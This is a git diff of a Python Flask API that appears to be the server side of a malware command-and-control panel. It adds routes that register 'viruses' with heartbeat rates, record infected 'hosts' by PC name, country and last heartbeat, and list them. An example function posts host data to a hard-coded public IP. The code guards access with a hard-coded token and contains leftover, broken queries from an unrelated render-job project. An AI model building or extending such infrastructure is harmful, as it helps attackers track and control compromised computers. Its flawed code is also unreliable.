@@ -25,7 +25,7 @@ userToken = '1234567890'
 def dbConnect():
     global conn
     #conn = sqlite3.connect('/var/www/instance/database.db')
-    conn = sqlite3.connect('/var/www/instance/databasen.db')
+    conn = sqlite3.connect('instance/databasen.db')
     global curs
     curs = conn.cursor()
 
@@ -125,7 +125,7 @@ def CheckKeys():
 ####### APIs ##########
 #######################
 
-## saves a job to render so the client PC can ask for open jobs, and then innerjoin the rest to get a list of images to download with SFTP
+## saves a virus 
 @api.route('/savevirus', methods=['POST'])
 def saveVirus():
     #data = request.get_json()
@@ -148,11 +148,7 @@ def saveVirus():
     print(name)
     print(token)
 
-    duplicateCheck = bool(Job.query.filter_by(user_id=user_id, name=name).first())
-    
-    print(duplicateCheck)
-    
-    if token == userToken and duplicateCheck == False:
+    if token == userToken :
         try:
             dbConnect()
             curs.execute("INSERT INTO Virus (virus_type, name, heartbeat_rate, user_id) VALUES (?, ?, ?, ?)", (virus_type, name, heartbeat_rate, user_id))
@@ -168,6 +164,93 @@ def saveVirus():
         print("token not valid or duplicate virus")
         flash('Duplicate virus  or wrong access token', category='error')
         return jsonify({'message': 'token not valid or duplicate virus '})
+
+
+## saves a hosts 
+@api.route('/savehost', methods=['POST'])
+def saveHost():
+    #data = request.get_json()
+    data = json.loads(request.data)
+        #     noteId = note['noteId']
+        #     note = Note.query.get(noteId)
+        #     if note:
+        #         if note.user_id == current_user.id:
+        #             db.session.delete(note)
+        #             db.session.commit()
+    print(data)
+    ## Test
+    
+    user_id = data['user_id']
+    virus_id = data['virus_id']
+    token = data['token']
+    pc_name = data['pc_name']
+    country = data['country']
+    host_notes = data['host_notes']
+    settings = data['settings']
+    last_heartbeat = data['last_heartbeat']
+
+
+    if token == userToken :
+        try:
+            dbConnect()
+            curs.execute("INSERT INTO Hosts (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat) VALUES (?, ?, ?, ?, ?, ?, ?)", (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat))
+            conn.commit()
+            conn.close()
+            print("Success")
+            flash('Host Created!', category='success')
+            return jsonify({'message': 'success'})
+        except Exception as e:
+            print(e)
+            return jsonify({'message': e})
+    else:
+        print("token not valid")
+        flash('Possible wrong access token', category='error')
+        return jsonify({'message': 'token not valid'})
+
+
+## Get all virus for the user to display in virus view
+
+# @login_required
+@api.route('/getvirus', methods=['GET'])
+def getvirus(userId = "1", token = "1234567890"):
+    print("getvirus")
+    # print(current_user.id)
+    # data = request.get_json()
+    # print(data)
+    # userId = data['userId']
+    # token = data['token']
+    # print(token)
+    if token == userToken:
+        try:
+            dbConnect()
+            print("Trying to get virus")
+            #curs.execute("SELECT Image.image_name FROM Image WHERE Image.imageset_id = ? AND Job.status = ?", (imageSetId, status))
+            curs.execute("SELECT * FROM rendered_model WHERE user_id = ?", (userId))
+            #curs.execute("SELECT Image.image_name FROM Image INNER JOIN Job ON ? = Image.imageset_id AND Job.status = ?", (imageSetId, status))
+            rows = curs.fetchall()
+            #print(json.dumps( [dict(ix) for ix in rows] ))
+            conn.close()
+            print("jsondump")
+            print(json.dumps(rows))
+            return json.loads(json.dumps(rows))
+        except Exception as e:
+            print(e)
+            return jsonify({'message': e})
+    else:
+        return jsonify({'message': 'token not valid'})
+#getJobs()
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -188,7 +271,7 @@ exampleUser = {
 exampleVirus = {
     "user_id": 1,
     "token": "1234567890",
-    "type": "Silent",
+    "virus_type": "Silent",
     "name": "TestVirus1",
     "heartbeat_rate": "1h",
     "user_id": 1
@@ -200,7 +283,7 @@ exampleHost= {
     "pc_name": "Silent",
     "country": "TestVirus1",
     "host_notes": "1h",
-    "settings ": "SomeSetting",
+    "settings": "SomeSetting",
     "last_heartbeat": "10/05/2023;21:45",
     "host_notes": "1h",
     "user_id": 1,
@@ -223,13 +306,25 @@ def apiVirusExample():
 @api.route('/apihostssendexample', methods=['GET', 'POST'])
 def apiHostsExample():
     try:
-        url = "http://207.127.88.215:5000/savehosts"
+        url = "http://207.127.88.215:5000/savehost"
         headers = {'Content-Type': 'application/json'}
         response = requests.post(url, data=json.dumps(exampleHost), headers=headers)
         return "Success"
     except Exception as e:
         print(e)
         return "Error"
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
